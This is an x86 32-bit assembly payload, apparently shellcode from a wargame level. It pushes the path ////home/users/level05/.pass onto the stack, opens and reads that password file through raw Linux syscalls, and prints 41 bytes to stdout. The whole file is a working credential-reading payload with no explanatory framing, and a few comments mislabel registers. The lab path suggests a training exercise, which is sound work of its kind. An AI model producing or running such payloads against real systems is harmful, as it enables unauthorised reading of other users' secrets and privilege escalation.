bits 32

section .text
	global _start

_start:
	push 0x00000001
	push 0x00000001
	push 0x00000001
	push 0x00000001
	push 0x00000001
	push 0x00000001
	push 0x00000001
	push 0x00000001
	push 0x00000001
	push 0x00000001
	push 0x00000073
	push 0x7361702e ; ssap
	push 0x2f2f3530 ; ./50
	push 0x6c657665 ; leve
	push 0x6c2f7372 ; l/sr
	push 0x6573752f ; esu/
	push 0x656d6f68 ; emoh
	push 0x2f2f2f2f ; ////

	xor eax, eax	; eax = 0
	xor ebx, ebx	; edx = 0
	xor ecx, ecx	; ecx = 0
	xor edx, edx	; ebx = 0

	mov al, 5		; open number
	mov ebx, esp	; path pointer
	mov cl, 2		; flags write/read
	mov dl, 1		; mode (not used for read only)
	int 0x80

	mov ebx, eax	; fd = return of open
	mov al, 3		; read number
	mov ecx, esp	; buff pointer
	mov dl, 41		; read size
	int 0x80

	mov al, 4		; write number
	mov bl, 1		; stdout
	mov ecx, esp	; pointer to read data
	mov dl, 41		; write size
	int 0x80

	mov al, 1
	int 0x80